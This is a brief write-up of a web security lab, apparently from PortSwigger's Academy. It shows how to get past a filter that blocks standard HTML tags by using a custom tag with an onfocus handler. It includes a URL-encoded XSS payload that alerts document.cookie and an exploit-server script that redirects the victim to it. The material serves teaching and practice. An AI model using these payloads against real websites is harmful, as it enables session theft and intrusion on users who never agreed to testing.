---
sidebar_position: 3
image: "https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
---

--> Here most of the tags are blocked. only custom tags are allowed so we have to use payloads with custom tags

With custom tag, we can use most of the events but in most of the events user have to do something to trigger the payload. But then i found that `focus` is very easy to do and that's why i chosen focus payload

--> Also i found same payload for focus on this website :

- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

which was like this :

```html
%3Cxss+id%253dx+onfocus%253dalert(document.cookie)+tabindex%253d1%3E#x
```

--> Now goto `exploit server` and now we will redirect the user to our payload and we can do this with [location](https://www.w3schools.com/js/js_window_location.asp) so let's use it but we have to write it between `<script>` tags to run js in our response.

==> So i made this payload:

```html
<script>
  location =
    "https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";
</script>
```

After that click `store` and then `send to victim`
